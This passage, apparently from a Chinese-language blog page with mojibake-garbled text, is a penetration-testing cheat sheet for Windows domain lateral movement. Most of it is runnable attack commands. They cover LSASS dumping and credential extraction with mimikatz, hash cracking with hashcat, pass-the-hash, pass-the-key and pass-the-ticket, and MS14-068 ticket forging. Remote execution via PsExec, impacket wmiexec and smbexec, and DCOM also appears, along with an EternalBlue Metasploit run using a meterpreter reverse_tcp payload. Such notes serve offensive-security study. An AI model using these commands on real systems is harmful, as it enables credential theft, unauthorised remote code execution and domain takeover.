<p>Procdumpä¸‹è½½ï¼š<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
<pre class="line-numbers language-none"><code class="language-none">#è¿è¡Œprocdump(å¿…é¡»æ˜¯ç®¡ç†å‘˜æƒé™)
procdump -accepteula -ma lsass.exe lsass.dmp
#è¿è¡Œmimikatz
privilege::debug
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="ä½¿ç”¨PowerShellæŠ“å–"><a href="#ä½¿ç”¨PowerShellæŠ“å–" class="headerlink" title="ä½¿ç”¨PowerShellæŠ“å–"></a>ä½¿ç”¨PowerShellæŠ“å–</h3><p><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">Nishang</a>çš„Get-PassHashesè„šæœ¬å¯ä»¥å¯¼å‡ºæ•£åˆ—å€¼</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell
<span class="token function">Import-Module</span> <span class="token punctuation">.</span><span class="token operator">/</span><span class="token function">Get-PassHashes</span><span class="token punctuation">.</span>ps1
<span class="token function">Get-PassHashes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>å¾—åˆ°hash</p>
<h2 id="ä½¿ç”¨Hashcatè·å–å¯†ç "><a href="#ä½¿ç”¨Hashcatè·å–å¯†ç " class="headerlink" title="ä½¿ç”¨Hashcatè·å–å¯†ç "></a>ä½¿ç”¨Hashcatè·å–å¯†ç </h2><p>kaliè‡ªå¸¦hashcat</p>
<p>1ã€æŒ‡å®šæ•£åˆ—å€¼çš„ç±»å‹</p>
<p>ä½¿ç”¨<code>-m</code>å‚æ•°æŒ‡å®šï¼š</p>
<p><img src="/images/hashcat1.png" alt="hashcat1"></p>
<p>2ã€æŒ‡å®šç ´è§£æ¨¡å¼</p>
<p>ä½¿ç”¨<code>-a</code>æŒ‡å®šï¼Œæœ‰ä»¥ä¸‹è¿™äº›æ¨¡å¼ï¼š</p>
<p><img src="/images/hashcat2.png" alt="hashcat2"></p>
<p>3ã€å¸¸ç”¨å‘½ä»¤</p>
<p>é€šå¸¸ä½¿ç”¨å­—å…¸æ¨¡å¼è¿›è¡Œç ´è§£ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 -m xx &lt;hashfile&gt; &lt;zidian1&gt; &lt;zidian2&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>-a 0ï¼šä»¥å­—å…¸æ¨¡å¼ç ´è§£</li>
<li>-m xxï¼šæŒ‡å®š&lt;hashfile&gt;å†…çš„æ•£åˆ—å€¼ç±»å‹</li>
<li>&lt;zidian1&gt; &lt;zidian2&gt;ï¼šæŒ‡å®šå­—å…¸æ–‡ä»¶</li>
</ul>
<p>å°†1åˆ°8æŒ‡å®šä¸ºæ•°å­—è¿›è¡Œç ´è§£ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --increment --increment-min 1 --increment-max 8 ?d?d?d?d?d?d?d -O<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç ´è§£Windowsæ•£åˆ—å€¼ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -m 1000 -a 0 -o winpassok.txt win.hash password.lst --username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>4ã€å¸¸ç”¨é€‰é¡¹</p>
<p>hashcat -h æŸ¥çœ‹å¸®åŠ©</p>
<ul>
<li>-showï¼šä»…æ˜¾ç¤ºå·²ç»ç ´è§£çš„å¯†ç </li>
<li>-oï¼šä¿å­˜ä½ç½®</li>
<li>-nï¼šçº¿ç¨‹æ•°</li>
<li>â€“removeï¼šæŠŠç ´è§£å‡ºæ¥çš„å¯†ç ä»æ•£åˆ—å€¼è¡¨ä¸­ç§»é™¤</li>
</ul>
<p>â€¦â€¦</p>
<h1 id="å“ˆå¸Œä¼ é€’æ”»å‡»"><a href="#å“ˆå¸Œä¼ é€’æ”»å‡»" class="headerlink" title="å“ˆå¸Œä¼ é€’æ”»å‡»"></a>å“ˆå¸Œä¼ é€’æ”»å‡»</h1><p>éœ€è¦ç®¡ç†å‘˜æƒé™</p>
<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>ä½¿ç”¨NTLM Hashè¿›è¡Œå“ˆå¸Œä¼ é€’</p>
<p>åœ¨ç›®æ ‡æœºå™¨ä¸­ï¼Œä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œmimikatzï¼Œè¾“å…¥å‘½ä»¤ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:administrator &#x2F;domain:yuming &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä¼šå¼¹å‡ºä¸€ä¸ªcmdçª—å£ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œipcè¿æ¥ï¼ˆä¸ç”¨æ˜æ–‡å¯†ç äº†ï¼‰ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\10.1.1.1\IPC$
dir \\10.1.1.1\c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h2 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h2><p>ä½¿ç”¨AES-256ç§˜é’¥è¿›è¡Œå“ˆå¸Œä¼ é€’</p>
<p>æ‰“äº†è¡¥ä¸<strong>kb2871997</strong>æ‰èƒ½ç”¨</p>
<p>é¦–å…ˆè¦å¾—åˆ°AES256çš„å€¼ï¼Œmimikatzï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
sekurlsa::ekeys

sekurlsa::pth &#x2F;user:administrator &#x2F;domain:yuming &#x2F;aes256:6f88e6d06c3ecb95e37fe23b3ef372738ec67871b71606c588a1668ca62161ac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">dir \\dc\c$		#è¿™é‡Œè¦å†™ä¸»æœºåï¼Œè€Œä¸æ˜¯ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h1 id="ç¥¨æ®ä¼ é€’æ”»å‡»"><a href="#ç¥¨æ®ä¼ é€’æ”»å‡»" class="headerlink" title="ç¥¨æ®ä¼ é€’æ”»å‡»"></a>ç¥¨æ®ä¼ é€’æ”»å‡»</h1><p>ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œä¾‹å¦‚PTT</p>
<h2 id="mimikatzè¿›è¡Œç¥¨æ®ä¼ é€’"><a href="#mimikatzè¿›è¡Œç¥¨æ®ä¼ é€’" class="headerlink" title="mimikatzè¿›è¡Œç¥¨æ®ä¼ é€’"></a>mimikatzè¿›è¡Œç¥¨æ®ä¼ é€’</h2><p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">mimikaz</a></p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge			&#x2F;&#x2F;æ¸…ç©ºå½“å‰æœºå™¨ä¸­æ‰€æœ‰å‡­è¯ï¼Œå¦‚æœæœ‰åŸŸæˆå‘˜å‡­è¯ä¼šå½±å“å‡­è¯ä¼ªé€ ã€‚
kerberos::list			&#x2F;&#x2F;æŸ¥çœ‹å½“å‰æœºå™¨å‡­è¯
kerberos::ptc ç¥¨æ®æ–‡ä»¶	 &#x2F;&#x2F;å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ä¸­<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>â‘ åˆ©ç”¨æœ¬åœ°ç¥¨æ®ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::tickets &#x2F;export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‰§è¡Œä¹‹åï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹å‡ºç°å¤šä¸ªæœåŠ¡çš„ç¥¨æ®æ–‡ä»¶ï¼Œä¾‹å¦‚krbtgtã€cifsã€ldapç­‰ã€‚</p>
<p>ä½¿ç”¨mimikatzæ¸…é™¤å†…å­˜ä¸­çš„ç¥¨æ®ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åå†å°†é«˜æƒé™çš„ç¥¨æ®æ–‡ä»¶æ³¨å…¥å†…å­˜ï¼Œå‘½ä»¤ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt ç¥¨æ®.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>â‘¡åˆ©ç”¨MS14-068ç”ŸæˆTGTæ•°æ®</p>
<pre class="line-numbers language-none"><code class="language-none">ms14-068.exe -u åŸŸæˆå‘˜å@åŸŸå -s sid -d åŸŸæ§åœ°å€ -p åŸŸæˆå‘˜å¯†ç 
MS14-068.exe -u jiarong.gao@yuming.com -s S-1-5-21-3032773461-2117130829-2438403642-1103 -d 10.1.1.1 -p 666.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç¥¨æ®æ³¨å…¥å†…å­˜</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::ptc TGT_mary@yuming.com.ccache&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æŸ¥çœ‹å‡­è¯åˆ—è¡¨</p>
<pre class="line-numbers language-none"><code class="language-none">klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åˆ©ç”¨</p>
<pre class="line-numbers language-none"><code class="language-none">dir \\dc\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="kekeoè¿›è¡Œç¥¨æ®ä¼ é€’"><a href="#kekeoè¿›è¡Œç¥¨æ®ä¼ é€’" class="headerlink" title="kekeoè¿›è¡Œç¥¨æ®ä¼ é€’"></a>kekeoè¿›è¡Œç¥¨æ®ä¼ é€’</h2><p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo/releases">kekeo</a></p>
<p>1.ç”Ÿæˆç¥¨æ®</p>
<pre class="line-numbers language-none"><code class="language-none">kekeo &quot;tgt::ask &#x2F;user:administrator &#x2F;domain:yuming.com &#x2F;ntlm:6f8a61c6702f90ae246aa2a298fcdc35&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2.å¯¼å…¥ç¥¨æ®</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt ç¥¨æ®å<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>2.æŸ¥çœ‹å‡­è¯</p>
<pre class="line-numbers language-none"><code class="language-none">klist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>4.åˆ©ç”¨net use è½½å…¥</p>
<pre class="line-numbers language-none"><code class="language-none">dir \\dc\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h1 id="PsExecçš„ä½¿ç”¨"><a href="#PsExecçš„ä½¿ç”¨" class="headerlink" title="PsExecçš„ä½¿ç”¨"></a>PsExecçš„ä½¿ç”¨</h1><p>èµ·åˆPsExecä¸»è¦ç”¨äºå¤§æ‰¹é‡Windowsä¸»æœºçš„è¿ç»´ï¼Œåœ¨åŸŸç¯å¢ƒä¸‹æ•ˆæœå°¤å…¶å¥½ã€‚ä½†æ˜¯ï¼Œæ”»å‡»è€…ä½¿ç”¨PsExecé€šè¿‡å‘½ä»¤è¡Œç¯å¢ƒä¸ç›®æ ‡æœºå™¨è¿›è¡Œè¿æ¥ï¼Œç”šè‡³æ§åˆ¶ç›®æ ‡æœºå™¨ã€‚</p>
<p>åœ¨ä½¿ç”¨PsExecæ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ul>
<li>éœ€è¦å¼€å¯admin$å…±äº«ï¼ˆé»˜è®¤å¼€å¯ï¼‰</li>
<li>ä¼šäº§ç”Ÿå¤§é‡æ—¥å¿—</li>
</ul>
<p>PsExecåŒ…å«åœ¨PsToolså·¥å…·åŒ…é‡Œï¼š<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools - Windows Sysinternals | Microsoft Docs</a></p>
<p>ç¬¬ä¸€ç§ï¼šå…ˆå»ºç«‹IPCè¿æ¥ï¼Œå†ä½¿ç”¨psexecï¼ˆéœ€è¦æ˜æ–‡æˆ–hashä¼ é€’ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\10.1.1.1\IPC$ &quot;666.com&quot; &#x2F;user:administrator	#å…ˆå»ºç«‹IPCè¿æ¥
psexec \\10.1.1.1 -s cmd           #-sä»¥Systemè¿è¡Œï¼Œè·å–Systemçš„cmd
PsExec.exe -accepteula \\10.1.1.1 -s cmd.exe	#è¿™æ¡å‘½ä»¤ä¹Ÿå¯è¡Œ
PsExec.exe -accepteula \\10.1.1.1 cmd.exe	#æ²¡æœ‰-så°±æ˜¯administratoræƒé™çš„cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç¬¬äºŒç§ï¼šä¸å»ºç«‹IPCè¿æ¥ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">psexec \\10.1.1.1 -u administrator -p 666.com -s cmd	#å»ºç«‹è¿œç¨‹è¿æ¥å¹¶æ‹¿cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>PsToolså·¥å…·åŒ…é‡Œçš„PsExecä½¿ç”¨<strong>hashesä¼ é€’</strong>æ—¶å¯èƒ½ä¼šå‡ºé”™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/releases">impacket</a> å·¥å…·åŒ…é‡Œçš„PsExecï¼Œè¿™ä¸ªæ˜¯åŸºäºå®˜æ–¹çš„PsExecäºŒæ¬¡å¼€å‘çš„ï¼Œå¯ä»¥è¿›è¡Œhashçš„ä¼ é€’ã€‚ä½†æ˜¯å®¹æ˜“è¢«æ€ï¼</p>
<pre class="line-numbers language-none"><code class="language-none">psexec -hashes :Hash .&#x2F;administrator@10.1.1.1 
psexec -hashes :Hash domain&#x2F;administrator@10.1.1.1 
psexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>Metasploitä¸­çš„psexecæ¨¡å—</strong></p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec
use exploit&#x2F;windows&#x2F;smb&#x2F;psexec_psh	#PsExecçš„PowerShellç‰ˆæœ¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç„¶åè®¾ç½®å¥½å‚æ•°ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">set rhost 10.1.1.1
set smbuser administrator
set smbpass 666.com
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="WMIçš„ä½¿ç”¨"><a href="#WMIçš„ä½¿ç”¨" class="headerlink" title="WMIçš„ä½¿ç”¨"></a>WMIçš„ä½¿ç”¨</h1><p>WMIæ˜¯ç”±ä¸€ç³»åˆ—å·¥å…·é›†ç»„æˆçš„ï¼Œå¯ä»¥åœ¨æœ¬åœ°æˆ–è€…è¿œç¨‹ç®¡ç†è®¡ç®—æœºç³»ç»Ÿã€‚</p>
<p>WMIæ˜¯é€šè¿‡<strong>135</strong>ç«¯å£è¿›è¡Œåˆ©ç”¨ã€‚æ”¯æŒç”¨æˆ·åæ˜æ–‡æˆ–è€…hashçš„æ–¹å¼è¿›è¡Œè®¤è¯ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•<strong>ä¸ä¼šåœ¨ç›®æ ‡æ—¥å¿—ç³»ç»Ÿç•™ä¸‹ç—•è¿¹</strong>ã€‚éœ€è¦ææƒã€‚</p>
<p>1ã€è‡ªå¸¦WMIC æ˜æ–‡ä¼ é€’ æ— å›æ˜¾ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:10.1.1.1 &#x2F;user:administrator &#x2F;password:666.com process call create &quot;cmd.exe &#x2F;c ipconfig &gt;C:\1.txt&quot;
å‘½ä»¤ç»“æœåœ¨1.txté‡Œï¼Œä¸”ä¿å­˜åœ¨10.1.1.1çš„ç”µè„‘é‡Œã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ä½¿ç”¨ç›®æ ‡ç³»ç»Ÿçš„cmd.exeæ‰§è¡Œä¸€æ¡å‘½ä»¤ipconfigï¼Œå°†æ‰§è¡Œç»“æœä¿å­˜åœ¨ç›®æ ‡ç³»ç»ŸCç›˜çš„1.txtæ–‡ä»¶ä¸­ã€‚</p>
<p>å¯ä»¥åœ¨å»ºç«‹ipc$è¿æ¥åï¼Œä½¿ç”¨typeå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶å†…å®¹ã€‚</p>
<p>2ã€è‡ªå¸¦cscriptæ˜æ–‡ä¼ è¾“ æœ‰å›æ˜¾</p>
<p>è¿™é‡Œéœ€è¦ä¸€ä¸ªæ–‡ä»¶ <a target="_blank" rel="noopener" href="https://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar">wmiexec.vbs</a> ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 10.1.1.1 administrator 666.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>3ã€å¥—ä»¶ <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/releases">impacket</a> çš„wmiexec  æ˜æ–‡æˆ–hashä¼ é€’ æœ‰å›æ˜¾exeç‰ˆæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">wmiexec .&#x2F;administrator:666.com@10.1.1.1 &quot;whoami&quot;
wmiexec ZJ&#x2F;administrator:666.com@10.1.1.1 &quot;whoami&quot;
wmiexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1 &quot;whoami&quot;
wmiexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ZJ&#x2F;administrator@10.1.1.1 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="æ°¸æ’ä¹‹è“æ¼æ´"><a href="#æ°¸æ’ä¹‹è“æ¼æ´" class="headerlink" title="æ°¸æ’ä¹‹è“æ¼æ´"></a>æ°¸æ’ä¹‹è“æ¼æ´</h1><p>msf</p>
<p>æ£€æµ‹æ¨¡å—ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ¼æ´åˆ©ç”¨æ¨¡å—ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue
set rhost 10.1.1.1
set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="smbexecçš„ä½¿ç”¨"><a href="#smbexecçš„ä½¿ç”¨" class="headerlink" title="smbexecçš„ä½¿ç”¨"></a>smbexecçš„ä½¿ç”¨</h1><p>smbexecå¯ä»¥é€šè¿‡æ–‡ä»¶å…±äº«ï¼ˆadmin$ã€c$ã€ipc$ã€d$ï¼‰åœ¨è¿œç¨‹ç³»ç»Ÿä¸­æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>impacketå·¥å…·åŒ…ä¸­çš„smbexec</p>
<p>ä¸ç”¨IPCè¿æ¥</p>
<pre class="line-numbers language-none"><code class="language-none">smbexec ZJ&#x2F;administrator:666.com@10.1.1.1
smbexec .&#x2F;administrator:666.com@10.1.1.1
smbexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 ZJ&#x2F;administrator@10.1.1.1
smbexec -hashes :6f8a61c6702f90ae246aa2a298fcdc35 .&#x2F;administrator@10.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="DCOMåœ¨è¿œç¨‹ç³»ç»Ÿä¸­çš„ä½¿ç”¨"><a href="#DCOMåœ¨è¿œç¨‹ç³»ç»Ÿä¸­çš„ä½¿ç”¨" class="headerlink" title="DCOMåœ¨è¿œç¨‹ç³»ç»Ÿä¸­çš„ä½¿ç”¨"></a>DCOMåœ¨è¿œç¨‹ç³»ç»Ÿä¸­çš„ä½¿ç”¨</h1><p>å­¦ä¹ è¿æ¥ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/109736280">åˆ©ç”¨DCOMå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ_Shanfenglan7çš„åšå®¢-CSDNåšå®¢_dcom å‘½ä»¤</a> </p>
<p>åœ¨ç®¡ç†å‘˜æƒé™çš„powershellï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))
$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ä¼šå¼¹å‡ºä¸€ä¸ªè®¡ç®—å™¨calc.exe</p>
<p>åœ¨æ¸—é€æ—¶ï¼Œå…ˆå»ºç«‹ipc$è¿æ¥</p>
<p>ç„¶åæ‰§è¡Œå‘½ä»¤ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;10.1.1.1&quot;))
$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>è°ƒç”¨9BA05972-F6A8-11CF-A442-00A0C90A8F39ï¼Œåœ¨è¿œç¨‹ä¸»æœºæ‰“å¼€powershellï¼Œè¾“å…¥å‘½ä»¤ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.124.3&quot;)
$obj &#x3D; [System.Activator]::CreateInstance($com)
$item &#x3D; $obj.item()
$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)

#æµ‹è¯•æˆåŠŸï¼Œä¸éœ€è¦å¯¹æ–¹ä¸»æœºçš„å‡­æ®ï¼Œåªéœ€è¦å½“å‰ä¸»æœºçš„ç®¡ç†å‘˜æƒé™å³å¯ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="SPNåœ¨åŸŸç¯å¢ƒä¸­çš„åº”ç”¨"><a href="#SPNåœ¨åŸŸç¯å¢ƒä¸­çš„åº”ç”¨" class="headerlink" title="SPNåœ¨åŸŸç¯å¢ƒä¸­çš„åº”ç”¨"></a>SPNåœ¨åŸŸç¯å¢ƒä¸­çš„åº”ç”¨</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/8082623.html">kerberosä¸­çš„spnè¯¦è§£ - æ¸—é€æµ‹è¯•ä¸­å¿ƒ - åšå®¢å›­ (cnblogs.com)</a></p>
<p>å¾®è½¯ç»™åŸŸå†…çš„<strong>æ¯ç§èµ„æº</strong>åˆ†é…äº†ä¸åŒçš„<strong>æœåŠ¡ä¸»ä½“åç§°</strong>ï¼ˆService Principal Nameï¼Œ<strong>SPN</strong>ï¼‰ã€‚</p>
<p>åŸŸæ¨ªå‘ç§»åŠ¨SPNæœåŠ¡ï¼šæ¢é’ˆã€è¯·æ±‚ã€å¯¼å‡ºã€ç ´è§£ã€é‡å†™ã€‚</p>
<h2 id="SPNç›¸å…³æ¦‚å¿µ"><a href="#SPNç›¸å…³æ¦‚å¿µ" class="headerlink" title="SPNç›¸å…³æ¦‚å¿µ"></a>SPNç›¸å…³æ¦‚å¿µ</h2><p>æœåŠ¡ä¸»ä½“åç§°ï¼ˆSPNï¼‰æ˜¯Kerberoså®¢æˆ·ç«¯ç”¨äºå”¯ä¸€æ ‡è¯†ç»™ç‰¹å®šKerberosç›®æ ‡è®¡ç®—æœºçš„æœåŠ¡å®ä¾‹åç§°ã€‚Kerberosèº«ä»½éªŒè¯ä½¿ç”¨SPNå°†<strong>æœåŠ¡å®ä¾‹</strong>ä¸<strong>æœåŠ¡ç™»å½•å¸æˆ·</strong>ç›¸å…³è”ã€‚å¦‚æœåœ¨æ•´ä¸ªæ—ä¸­çš„è®¡ç®—æœºä¸Šå®‰è£…å¤šä¸ªæœåŠ¡å®ä¾‹ï¼Œåˆ™æ¯ä¸ªå®ä¾‹éƒ½å¿…é¡»å…·æœ‰è‡ªå·±çš„SPNã€‚å¦‚æœå®¢æˆ·ç«¯å¯èƒ½ä½¿ç”¨å¤šä¸ªåç§°è¿›è¡Œèº«ä»½éªŒè¯ï¼Œåˆ™ç»™å®šçš„æœåŠ¡å®ä¾‹å¯ä»¥å…·æœ‰å¤šä¸ªSPNã€‚ä¾‹å¦‚ï¼ŒSPNæ€»æ˜¯<strong>åŒ…å«</strong>è¿è¡ŒæœåŠ¡å®ä¾‹çš„ä¸»æœºåç§°ï¼Œæ‰€ä»¥æœåŠ¡å®ä¾‹å¯ä»¥ä¸ºå…¶ä¸»æœºçš„æ¯ä¸ªåç§°æˆ–åˆ«åæ³¨å†Œä¸€ä¸ªSPNã€‚</p>
<p>æ ¹æ®Kerberosåè®®ï¼Œå½“ç”¨æˆ·è¾“å…¥è‡ªå·±çš„è´¦å·å’Œå¯†ç ç™»å½•æ´»åŠ¨ç›®å½•æ—¶ï¼ŒåŸŸæ§ä¼šå¯¹è´¦å·å’Œå¯†ç è¿›è¡ŒéªŒè¯ã€‚éªŒè¯é€šè¿‡åï¼Œç§˜é’¥åˆ†å‘ä¸­å¿ƒ(KDC)ä¼šå°†æœåŠ¡æˆæƒçš„ç¥¨æ®(TGT)å‘é€ç»™ç”¨æˆ·ä½œä¸ºç”¨æˆ·è®¿é—®æœåŠ¡èµ„æºçš„èº«ä»½å‡­æ®ã€‚</p>
<blockquote>
<p>ä¾‹å¦‚ï¼šå½“ç”¨æˆ·éœ€è¦è®¿é—®MSSQLæœåŠ¡æ—¶ï¼Œç³»ç»Ÿä¼šä»¥å½“å‰ç”¨æˆ·èº«ä»½å‘åŸŸæ§æŸ¥è¯¢SPNä¸ºâ€MSSQLâ€çš„è®°å½•ã€‚æ‰¾åˆ°è¯¥SPNè®°å½•åï¼Œç”¨æˆ·ä¼šå†æ¬¡ä¸KDCé€šä¿¡ï¼Œå°†KDCå‘æ”¾çš„TGTä½œä¸ºèº«ä»½å‡­æ®å‘é€ç»™KDCï¼Œå¹¶å°†éœ€è¦è®¿é—®çš„SPNå‘é€ç»™KDCã€‚KDCä¸­çš„èº«ä»½éªŒè¯æœåŠ¡(AS)å¯¹TGTè¿›è¡Œè§£å¯†ã€‚ç¡®è®¤æ— è¯¯åTGSå°†ä¸€å¼ å…è®¸è®¿é—®è¯¥SPNæ‰€å¯¹åº”çš„æœåŠ¡çš„ç¥¨æ®å’ŒæœåŠ¡åœ°å€å‘é€ç»™ç”¨æˆ·ã€‚ç”¨æˆ·å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªç¥¨æ®è®¿é—®MSSQLæœåŠ¡äº†ã€‚</p>
</blockquote>
<p>SPNå‘½ä»¤çš„æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">SPN &#x3D; serviceclass &quot;&#x2F;&quot; hostname [&quot;:&quot;port] [&quot;&#x2F;&quot; servicename]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>serviceclassï¼šæœåŠ¡ç»„ä»¶åç§°</li>
<li>hostnameï¼šä¸»æœºåï¼ˆå¸¦æœ‰åŸŸå</li>
<li>portï¼šæœåŠ¡ç›‘å¬ç«¯å£</li>
<li>servicenameï¼šä¸€ä¸ªå­—ç¬¦ä¸²</li>
</ul>
<p><strong>å¸¸è§SPNæœåŠ¡ï¼š</strong></p>
<p>MSSQL æœåŠ¡çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
